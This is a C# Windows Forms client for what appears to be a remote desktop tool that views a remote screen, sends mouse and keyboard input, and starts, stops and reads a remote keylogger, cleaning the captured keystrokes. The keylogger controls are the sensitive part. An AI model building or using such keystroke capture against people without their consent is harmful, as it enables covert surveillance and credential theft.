using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using ClientDll;

namespace Client
{
    public partial class Form1 : Form
    {
        bool FullScreen;
        private AbstractClient client;
        string sharedPath = @"\\risinas\Temp\RDC";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //client = ClientFactory.GetClient(ClientType.TCPClient,"1020");
            client = ClientFactory.GetClient(ClientType.FileClient, sharedPath);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
                client.Dispose(true);
            }
            base.Dispose(disposing);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                this.WindowState = FormWindowState.Maximized;
                pictureBox1.Left = this.Left;
                pictureBox1.Top = this.Top;
                pictureBox1.Width = this.Width;
                pictureBox1.Height = this.Height;
                FullScreen = true;
            }
            else
            {
                pictureBox1.Left = 12;
                pictureBox1.Top = 320;
                pictureBox1.Width = 717;
                pictureBox1.Height = 312;
                FullScreen = false;

            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                timer1.Enabled = true;
            }
            else
            {
                timer1.Enabled = false;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.GetScreen();
            //  HandleScroll();
        }

        private void btnDisconnect_Click(object sender, EventArgs e)
        {
            client.DisConnectServer();
            MessageBox.Show("Dissconceted");
            b2.Enabled = true;
            btnDisconnect.Enabled = false;
        }

        private void btnStartKeyLogging_Click(object sender, EventArgs e)
        {
            try
            {
                client.StartKeylog();
                btnStartKeyLogging.Enabled = false;
                btnStopKeyLogging.Enabled = true;
                btnGetKey.Enabled = true;

            }
            catch (Exception ee)
            {
                MessageBox.Show("Exception reading from Server:" + ee.ToString());
            }

        }

        private void btnStopKeyLogging_Click(object sender, EventArgs e)
        {
            try
            {
                client.Stopkeylog();
                btnStartKeyLogging.Enabled = true;
            }
            catch (Exception ee)
            {
                MessageBox.Show("Exception reading from Server:" + ee.ToString());
            }

        }

        private void btnGetKey_Click(object sender, EventArgs e)
        {
            try
            {
                txtKeys.Text = "Reading Message";
                txtKeys.Text += "\n" + ProcessKey(client.Getkey());
            }
            catch (Exception ex)
            {
                MessageBox.Show("Exception reading from Server:" + ex.ToString());
            }
        }

        #region processKey
        private string ProcessKey(string input)
        {
            char[] ch = { ' ' };
            string[] arr = input.Split(ch);
            return RemoveBackSpace(arr);
        }

        private string RemoveBackSpace(string[] input)
        {
            string rtn = string.Empty;
        mylabel:
            for (int i = 0; i < input.Length; i++)
            {
                if (input[i] == "Back")
                {
                    input = RemoveElement(input, i);
                    input = RemoveElement(input, i - 1);
                    goto mylabel;

                }

            }

            return ArrayToString(input);
        }

        private string[] RemoveElement(string[] input, int indx)
        {


            string[] arr = new string[input.Length - 1];
            int j = 0;

            for (int i = 0; i < input.Length; i++)
            {
                if (indx != i)
                {
                    arr[j] = input[i];
                    j++;

                }
            }

            return arr;
        }

        private string ArrayToString(string[] input)
        {
            string rtn = string.Empty;

            for (int i = 0; i < input.Length; i++)
            {
                rtn += input[i];
            }
            return rtn;
        }

        #endregion


        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            switch (e.Button)
            {
                case MouseButtons.Left:
                    client.MouseClickLeft(e.X, e.Y);
                    break;
                case MouseButtons.Right:
                    client.MouseClickRight(e.X, e.Y);
                    break;
            }
        }

        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            int moveBy = 10;
        
            if (this.ActiveControl != txtKeys)
            {
                SendKey(e);
                return;
            }
            if (e.Shift)
                moveBy = 10;

            // MessageBox.Show(e.KeyData.ToString());
            switch (e.KeyData)
            {
                case Keys.Up:
                    groupBox3.Top = groupBox3.Top - moveBy;
                    break;
                case Keys.Down:
                    groupBox3.Top = groupBox3.Top + moveBy;
                    break;
                case Keys.Left:
                    groupBox3.Left = groupBox3.Left - moveBy;
                    break;
                case Keys.Right:
                    groupBox3.Left = groupBox3.Left + moveBy;
                    break;

            }

        }


        private void SendKey(KeyEventArgs e)
        {
            client.SendKey(e.KeyCode.ToString());
        }

        private void HandleScroll(Object sender, ScrollEventArgs se)
        {
            /* Create a graphics object and draw a portion 
               of the image in the PictureBox. */
            Graphics g = pictureBox1.CreateGraphics();

            g.DrawImage(pictureBox1.Image,
              new Rectangle(0, 0, pictureBox1.Right - vScrollBar1.Width,
              pictureBox1.Bottom - hScrollBar1.Height),
              new Rectangle(hScrollBar1.Value, vScrollBar1.Value,
              pictureBox1.Right - vScrollBar1.Width,
              pictureBox1.Bottom - hScrollBar1.Height),
              GraphicsUnit.Pixel);


            pictureBox1.Update();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


    }
}